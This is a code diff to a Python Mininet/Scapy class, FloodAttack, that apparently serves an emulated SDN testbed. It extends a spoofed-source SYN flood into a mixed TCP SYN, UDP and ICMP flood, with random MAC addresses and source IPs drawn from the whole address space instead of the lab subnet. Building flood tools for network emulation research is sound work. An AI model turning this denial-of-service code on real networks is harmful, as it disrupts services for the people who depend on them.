@@ -9,13 +9,11 @@ from threading import Thread, Event
 from mininet.node import OVSSwitch, Intf
 
 from scapy.all import (
-    Ether, IP, TCP, Packet, sendp
+    Ether, IP, TCP, UDP, ICMP, Packet, sendp,
+    fuzz, RandIP, RandMAC, RandChoice, RandShort
 )
 
 class FloodAttack:
-    """
-    mininet> py FloodAttack(s1, s2.intfList()[1], 10, 1, 2, 1).start()
-    """
 
     def __init__(self, switch: OVSSwitch, iface: Intf, npacket: int, threads: int, bsize: int, bdelay: int):
         self.switch = switch
@@ -42,25 +40,48 @@ class FloodAttack:
 
     @staticmethod
     def random_mac() -> str:
-        octets = [random.randint(0x00, 0xFE) for _ in range(6)]
-        octets[0] &= 0xFE
-        return ":".join(f"{o:02x}" for o in octets)
+        return str(RandMAC())
 
     @staticmethod
     def random_ip() -> str:
-        subnet: str = "10.0.0"
-        return f"{subnet}.{random.randint(1, 254)}"
+        return str(RandIP())
 
     @staticmethod
     def random_port() -> int:
         return random.randint(1024, 65535)
 
+    SUPPORTED_PROTOS = ["TCP", "UDP", "ICMP"]
+
+    @staticmethod
+    def random_proto() -> str:
+        return random.choice(FloodAttack.SUPPORTED_PROTOS)
+
     @staticmethod
     def build_packet(src_mac: str, src_ip: str, dst_mac: str, dst_ip: str) -> Packet:
+
         eth = Ether(src=src_mac, dst=dst_mac)
-        ip = IP(src=src_ip, dst=dst_ip)
-        tcp = TCP(sport=FloodAttack.random_port(), dport=FloodAttack.random_port(), flags="S")  # SYN
-        return eth / ip / tcp
+        ip  = IP(src=src_ip, dst=dst_ip)
+
+        proto = FloodAttack.random_proto()
+
+        if proto == "TCP":
+            transport = TCP(
+                sport=FloodAttack.random_port(),
+                dport=FloodAttack.random_port(),
+                flags="S"
+            )
+        elif proto == "UDP":
+            transport = UDP(
+                sport=FloodAttack.random_port(),
+                dport=FloodAttack.random_port()
+            )
+        elif proto == "ICMP":
+            transport = ICMP(
+                type=random.choice([0, 8]),   # 0 = reply, 8 = echo request
+                code=0
+            )
+
+        return eth / ip / transport
 
     def send_packets(self, packets: List[Packet]):
         """Invia i pacchetti in burst tramite worker thread, rispettando _stop_event."""
